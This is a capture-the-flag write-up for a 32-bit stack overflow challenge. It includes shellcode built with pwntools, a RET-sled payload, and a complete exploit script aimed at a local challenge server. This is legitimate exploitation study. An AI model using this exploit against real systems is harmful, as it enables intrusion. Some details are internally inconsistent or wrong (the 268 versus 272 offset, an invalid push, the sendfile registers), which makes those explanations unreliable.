# ASR (Advanced Shellcode Runner) - Complete Writeup

**Challenge Type:** Binary Exploitation / Pwn  
**Architecture:** 32-bit ELF (x86)  
**Difficulty:** Hard (1 solve)  
**Key Concepts:** Stack Buffer Overflow, Ret2Shellcode, RET Sled, Stack Alignment

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Code Analysis](#code-analysis)
4. [Failed Approach: Brute Force](#failed-approach-brute-force)
5. [Working Approach: RET Sled](#working-approach-ret-sled)
6. [Exploit Development](#exploit-development)
7. [Common Confusions & Resolutions](#common-confusions--resolutions)
8. [Final Exploit](#final-exploit)

---

## Challenge Overview

ASR is a 32-bit stack buffer overflow challenge where you need to exploit a vulnerable `strcpy` call to execute shellcode and read `/flag.txt`. The twist? Environment differences between local and remote make traditional stack address guessing unreliable.

**Why This Was Hard:**
- Initial binary wasn't provided (wasted time on wrong architecture)
- Environment blindness (Docker vs remote server stack addresses differ)
- Requires understanding RET sled technique for stack alignment

---

## Initial Reconnaissance

### Step 1: File Analysis

```bash
file chall
```

**Output:**
```
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

**Critical Finding:** 32-bit binary. This means:
- Use 32-bit shellcode (`int 0x80` syscalls)
- Addresses are 4 bytes
- Registers: `eax`, `ebx`, `ecx`, `edx`, `eip`, `esp`, `ebp`

### Step 2: Security Analysis

```bash
checksec --file=chall
```

**Output:**
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```

**Security Features:**
- ✅ **NX Disabled**: Stack is EXECUTABLE → We can run shellcode from stack
- ✅ **No PIE**: Code addresses are static (always load at `0x08048000`)
- ✅ **No Canary**: No stack protection cookies
- ⚠️ **ASLR Still Active**: Stack/heap addresses randomize (environment-dependent)

---

## Code Analysis

### The Vulnerable Function: `processData`

```c
void processData(char *param_1) {
  char local_110[264];  // Buffer: 264 bytes
  
  // VULNERABILITY: No bounds checking
  strcpy(local_110, param_1);
  
  // This clobbers EAX register (kills any buffer address stored there)
  printf("Data processed: %s\n", local_110);
  
  logMessage(local_110);
  return;  // Returns to address at [EBP+4]
}
```

### Stack Layout Visualization

```
Low Memory (Top of Stack)
+---------------------------+
|                           |
|   local_110 [264 bytes]   | ← Buffer starts here
|                           |
+---------------------------+ ← Offset 264
|   Saved EBP [4 bytes]     | ← Old frame pointer
+---------------------------+ ← Offset 268
|   Return Address [4 bytes]| ← EIP (our target!)
+---------------------------+ ← Offset 272
High Memory (Bottom of Stack)
```

**The Math:**
- Buffer size: 264 bytes
- Saved EBP: 4 bytes
- **Offset to EIP: 268 bytes**
- **Total payload minimum: 272 bytes** (to overwrite EIP)

### Critical Understanding: strcpy and Null Bytes

**Question I Had:** "Decoded bytes contain embedded nulls which cannot be passed as argv. What does this mean?"

**Answer:** `strcpy` stops copying when it hits a null byte (`0x00`). This is how C strings work - they're terminated by `\0`. If your shellcode or addresses contain `0x00`, the copy stops early and your exploit breaks.

**Solution:** Use null-free shellcode and avoid addresses with null bytes where possible.

---

## Failed Approach: Brute Force

### The Idea

Since we control EIP, why not guess stack addresses until we hit our shellcode?

```python
# Failed brute force attempt
for addr in range(0xffa00000, 0xffb00000, 0x1000):
    payload = shellcode.ljust(268, b"\x90")
    payload += p32(addr)  # Guess stack address
    # Send and pray
```

### Why It Failed

1. **Wrong Address Range**: I was searching `0xffa00000` - `0xffb00000`
   - Docker environment uses different stack base (likely `0xff800000` or `0xbf000000`)
   - This is environment-dependent and unknowable without info leak

2. **Too Wide Search Space**: 
   - Stack randomization gives us `2^16` possibilities (65,536 addresses)
   - Each guess takes time; infeasible for CTF timeframe

3. **Environment Blindness**:
   - Local Docker stack ≠ Remote server stack
   - Testing locally gave false confidence

**Lesson:** Brute forcing stack addresses is trash when you don't have the actual binary environment. Need deterministic approach.

---

## Working Approach: RET Sled

### The Core Problem

Even if we know the general stack location, the exact offset varies between environments:
- Your Docker: Shellcode at `0xffee1234`
- Remote Server: Shellcode at `0xffee1350` (shifted by 284 bytes)

Traditional NOP sled helps with small offsets (±50 bytes), but not large shifts.

### The RET Sled Technique

**Concept:** Instead of guessing the stack, abuse the fact that **code addresses are static** (No PIE).

**How It Works:**

1. Find a `ret` instruction in the binary (e.g., at `0x080490dc`)
2. Fill the stack with this address repeatedly
3. When EIP jumps to this address, it executes `ret`
4. `ret` pops the next value from stack (another `0x080490dc`) and jumps there
5. This creates a "slide" effect: `ret → ret → ret → ...`
6. Eventually hits our actual payload/shellcode

**Visualization:**

```
Stack Before Exploit:
[Buffer Data]
[Saved EBP]
[Real Return Address] ← CPU will return here

Stack After Exploit:
[Shellcode + NOPs (272 bytes)]
[0x080490dc] ← EIP jumps here (ret instruction)
[0x080490dc] ← ret pops this, jumps here
[0x080490dc] ← ret pops this, jumps here
[0x080490dc] ... (64 times)
[0x0804931d] ← Final pivot address (main+137)
[0x0804901e] ← Cleanup (pop ebx; ret)
```

**Why This Works:**

- `ret` addresses are static (No PIE)
- Creates alignment tolerance: if ESP is off by 4-256 bytes, we still slide through
- Acts like a "vacuum" sucking execution through the stack until it hits our target

### Key Insight: Why Not Just Jump to Stack?

**Question I Had:** "Why do you need to find the stack? I don't get it."

**Answer:** Because the CPU needs an address to jump to. EIP holds a 4-byte memory address, not code. Without knowing where our shellcode lives in memory, we can't point EIP there.

The RET sled solves this by making the target address **static** (code section) while still eventually reaching our dynamic shellcode.

---

## Exploit Development

### Step 1: Generate Shellcode

```python
from pwn import *

context.arch = 'i386'  # 32-bit

# Open /flag.txt (returns fd in EAX)
assembly = shellcraft.open('/flag.txt', 0)

# Send file contents to stdout (fd=1)
# sendfile(stdout, file_fd, offset, count)
assembly += shellcraft.sendfile(1, 'eax', 0, 500)

shellcode = asm(assembly)
print(f"Shellcode length: {len(shellcode)}")  # ~38-40 bytes
```

**Question I Had:** "Why need 38 bytes of shellcode? Wtf why?"

**Answer:** Shellcode isn't magic text - it's actual machine code instructions:
```asm
; Open syscall
push 0x00             ; Null terminator
push 0x7478742e       ; "txt."
push 0x67616c662f     ; "/flag"
mov ebx, esp          ; filename pointer
xor ecx, ecx          ; flags = O_RDONLY
mov eax, 5            ; sys_open
int 0x80              ; syscall

; Sendfile syscall  
mov ebx, 1            ; out_fd = stdout
; eax already has file_fd
xor edx, edx          ; offset = NULL
mov esi, 500          ; count = 500
mov eax, 187          ; sys_sendfile
int 0x80              ; syscall
```

Each instruction = 2-5 bytes. Total: ~38 bytes.

### Step 2: Find Gadgets

We need addresses of `ret` instructions in the binary.

```bash
objdump -d chall | grep -A 5 "_start"
```

**Output:**
```
080490b0 <_start>:
 80490b0:   31 ed                   xor    %ebp,%ebp
 ...
 80490dc:   c3                      ret
```

**Math:** `_start` = `0x080490b0`, offset `+44` (decimal) = `0x080490dc`

```python
exe = ELF('./chall')
ret_gadget = exe.sym["_start"] + 44  # 0x080490dc
```

Similarly, find a clean return point in `main`:

```bash
objdump -d chall | grep -A 150 "main"
```

**Output:**
```
08049294 <main>:
 ...
 804931d:   c3                      ret
```

**Math:** `main` = `0x08049294`, offset `+137` = `0x0804931d`

```python
pivot_gadget = exe.sym["main"] + 137  # 0x0804931d
```

**Question I Had:** "Why we need _start + 44 and main + 137?"

**Answer:**
- `_start + 44`: A simple `ret` instruction for our RET sled
- `main + 137`: A `ret` instruction that doesn't modify stack registers (clean pivot point)

### Step 3: Construct Payload

```python
offset = 272  # Distance to EIP

# Part 1: Shellcode + NOPs
payload = shellcode.ljust(offset, b"\x90")
# [Shellcode (38 bytes)][NOPs (234 bytes)]

# Part 2: RET Sled (64 returns)
payload += p32(ret_gadget) * 0x40  # 64 * 4 = 256 bytes
# Overwrites EIP + creates landing pad for misaligned ESP

# Part 3: Pivot to clean return
payload += p32(pivot_gadget)

# Part 4: Cleanup
pop_ebx = 0x0804901e  # pop ebx; ret gadget
payload += p32(pop_ebx)
```

**Question I Had:** "The Sled carries it safely to the next 4-byte boundary. Then why need so many ret? Just 4 I thought is enough?"

**Answer:**
- 4 RETs fix **micro-alignment** (1-3 byte offsets within a 4-byte boundary)
- 64 RETs fix **macro-alignment** (large stack shifts of 50-300 bytes between environments)
- We need a wide "net" to catch ESP regardless of where the remote server's stack is

### Step 4: Send Exploit

```python
import requests

url = "http://localhost:5001/"  # Adjust for remote

# Convert to hex (web interface expects hex input)
hex_payload = payload.hex()

r = requests.post(url, data={"hex_value": hex_payload})

if "RE:CTF{" in r.text or "flag{" in r.text:
    print("[+] SUCCESS!")
    print(r.text)
else:
    print("[-] No flag found")
    print(r.text[:500])
```

---

## Common Confusions & Resolutions

### 1. EIP vs Code Execution

**Confusion:** "I thought when reach EIP, just write `system('/bin/sh')`?"

**Reality:** EIP is a **pointer** (4-byte memory address), not a command line. You can't write text commands into it. You must:
1. Put your code somewhere in memory (stack)
2. Put the **address** of that code into EIP

Think of EIP as GPS coordinates, not the actual destination.

### 2. NOPs Purpose

**Confusion:** "What is NOP? Why not just put 1000?"

**Answer:**
- `NOP` (`0x90`) is a valid CPU instruction meaning "do nothing, move to next instruction"
- `1000` (decimal) = `0x03E8` (hex) is **not** a valid instruction → CPU crash
- NOPs create a "slide zone" where landing anywhere executes harmlessly until you hit payload

**Confusion:** "If you jump to 'offset 30' (NOP #30), will the NOPs pass it or what?"

**Answer:** NOPs are like a train track:
```
[NOP][NOP][NOP][Shellcode]
  ↑ Land here
  → Execute NOP (do nothing, advance)
     → Execute NOP (do nothing, advance)
        → Execute NOP (do nothing, advance)
           → Execute Shellcode!
```

The CPU doesn't "pass" or skip - it executes each NOP sequentially (doing nothing) until it reaches shellcode.

### 3. Why NOPs Before Shellcode

**Confusion:** "Why put NOPs first? I still don't get it."

**Answer:** CPU reads memory forward (low → high addresses):

```
✅ CORRECT:
[NOPs][Shellcode]
  ↑ Land anywhere here
  → Slide forward → Eventually hit shellcode

❌ WRONG:
[Shellcode][NOPs]
  ↑ If you miss shellcode
  → Slide into NOPs → Slide into garbage → Crash
```

### 4. Stack Address vs Buffer Address

**Confusion:** "What address are u finding? The buffer address?"

**Answer:** Yes. The "buffer address" is where `local_110` lives in memory. Since this is on the stack, it's also called the "stack address." We're finding the exact memory location of our injected shellcode.

**Confusion:** "How tf u know the address u are finding is what u want?"

**Answer:** By observing server response:
- **Crash/Error:** Wrong address (jumped to garbage)
- **Flag returned:** Correct address (jumped to our shellcode, it executed)

### 5. Why call eax Failed

**Confusion:** Initial attempt used `call eax` thinking EAX held buffer address.

**Why it failed:**
```c
strcpy(local_110, param_1);  // EAX = buffer address
printf("...", local_110);    // EAX = number of chars printed (CLOBBERED!)
```

`printf` overwrites EAX with return value. By the time we jump, EAX is garbage.

**Lesson:** Track register states through function calls. Return values destroy registers.

### 6. Interactive Shell Problem

**Confusion:** "Can we just spawn the shell, I can run ls to get the flag.txt myself?"

**Answer:** No. The challenge runs via Python `subprocess.run()`:
- Captures stdout/stderr
- **Doesn't connect stdin** to your terminal
- Shell spawns but hangs waiting for input you can't send

**Solution:** Use non-interactive shellcode (open-read-write) that outputs flag directly.

### 7. Alignment

**Confusion:** "What is alignment? Why system need alignment?"

**Answer:** CPUs access memory in chunks (4 bytes on 32-bit). Instructions and data should start at addresses divisible by 4:
- ✅ `0x08048000` (divisible by 4)
- ❌ `0x08048002` (not aligned, may crash)

The RET sled ensures execution synchronizes to 4-byte boundaries by repeatedly popping stack values.

---

## Final Exploit

```python
from pwn import *
import requests

# Set context for 32-bit binary
context.binary = exe = ELF('./chall', checksec=False)

def get_payload():
    # 1. Setup Shellcode (Open /flag.txt, sendfile to stdout)
    assembly = shellcraft.open('/flag.txt', 0)
    assembly += shellcraft.sendfile(1, 'eax', 0, 500)
    shellcode = asm(assembly)
    
    # 2. Construct Payload
    offset = 272
    
    # Address of 'ret' instruction (Gadget for Ret-Sled)
    ret_gadget = exe.sym["_start"] + 44  # 0x080490dc
    
    # pop ebx; ret gadget
    pop_ebx = 0x0804901e 
    
    # 3. Final Layout
    # [Shellcode + NOP padding to 272] + [Ret Sled] + [Final Jump] + [Cleanup]
    payload = shellcode.ljust(offset, b"\x90") 
    payload += p32(ret_gadget) * 0x40      # The "Ret Sled" (256 bytes)
    payload += p32(exe.sym["main"] + 137)  # Clean return point
    payload += p32(pop_ebx)                # Alignment/cleanup
    
    return payload

def send_exploit():
    payload = get_payload()
    print(f"[*] Payload length: {len(payload)}")
    
    # Send to server (adjust URL for remote)
    url = "http://localhost:5001/"
    
    try:
        r = requests.post(url, data={"hex_value": payload.hex()})
        print("\n[+] Response from Server:")
        
        if "RE:CTF" in r.text or "flag{" in r.text:
            print(r.text)
        else:
            print("[-] Flag not found in response. Raw output:")
            print(r.text[:500])
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    send_exploit()
```

---

## Key Takeaways

### What Made This Hard
1. **Binary not provided initially** → Wasted time on 64-bit payloads
2. **Environment differences** → Brute force failed due to stack randomization
3. **Required advanced technique** → RET sled not commonly taught

### Core Skills Required
- ✅ Stack buffer overflow fundamentals
- ✅ Understanding 32-bit vs 64-bit architecture
- ✅ ROP gadget finding (`objdump`, `ROPgadget`)
- ✅ Stack alignment concepts
- ✅ Shellcode crafting (pwntools)

### Methodology for Future Challenges
1. **File analysis first** (`file`, `checksec`)
2. **Code review** (understand the vulnerability)
3. **Calculate offsets** (buffer size → EIP)
4. **Check for easy wins** (NX disabled? PIE disabled?)
5. **If brute force fails** → Look for deterministic alternatives (ROP, info leaks)
6. **Test locally** → Adjust for remote environment
7. **Debug thoroughly** (GDB, strace, print statements)

### Commands Cheat Sheet
```bash
# Binary analysis
file chall
checksec --file=chall

# Disassembly
objdump -d chall
objdump -d chall | grep "_start" -A 20

# Find gadgets
ROPgadget --binary chall
ROPgadget --binary chall | grep "ret"

# Run locally (if you have the binary)
./chall $(python -c 'print("A"*272 + "\xdc\x90\x04\x08")')

# Debug with GDB
gdb ./chall
(gdb) disas main
(gdb) break *main
(gdb) run $(python -c 'print("A"*300)')
(gdb) info registers
(gdb) x/40x $esp
```

---

## Final Notes

This challenge demonstrates that **simple vulnerabilities can still be hard** when environmental factors come into play. The buffer overflow itself is trivial, but exploiting it reliably requires understanding:

- How stack randomization affects exploitation
- When to abandon brute force for deterministic methods
- How ROP techniques can bypass alignment issues
- The difference between local and remote environments

**Lesson:** When brute force fails, don't keep hammering. Step back, analyze what's static (code addresses), and build a reliable exploit around that.

Flag: `RE:CTF{...}`

---

*Written after 20+ hours of pain, confusion, and eventually triumph. Remember: every "trash" idea teaches you what NOT to do. That's still progress.*
